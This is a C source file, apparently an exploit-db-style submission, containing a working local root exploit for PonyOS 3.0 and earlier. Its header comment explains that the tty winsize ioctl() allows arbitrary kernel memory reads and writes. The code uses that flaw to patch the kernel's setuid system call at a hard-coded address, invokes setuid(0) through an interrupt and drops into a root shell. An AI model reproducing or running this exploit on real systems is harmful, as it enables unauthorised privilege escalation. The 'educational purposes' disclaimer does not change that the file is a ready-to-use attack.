/* PonyOS <= 3.0 tty ioctl() root exploit
  ========================================
  PonyOS 0.4.99-mlp had two kernel vulnerabilities
  disclosed in April 2013 that could be leveraged 
  to read/write arbitrary kernel memory. This is 
  due to tty winsize ioctl() allowing to read/write
  arbitrary memory. This exploit patches the setuid
  system call to remove a root uid check allowing
  any process to obtain root privileges. 

  John Cartwright found these flaws and others here:
  https://www.exploit-db.com/exploits/24933/

  Written for educational purposes only. Enjoy!  

   -- prdelka

*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>

int main(){
	struct winsize ws;
	printf("[+] PonyOS <= 3.0 ioctl() local root exploit\n");
	memcpy(&ws,"\x90\x90\x90\x90\x8b\x45\x08\x89",8);
	ioctl(0, TIOCSWINSZ, &ws);
	ioctl(0, TIOCGWINSZ, (void *)0x0010f101);
	printf("[-] patched sys_setuid()\n");
	__asm("movl $0x18,%eax");
	__asm("xorl %ebx,%ebx");
	__asm("int $0x7F");
	printf("[-] Got root?\n");
	system("/bin/sh");
}
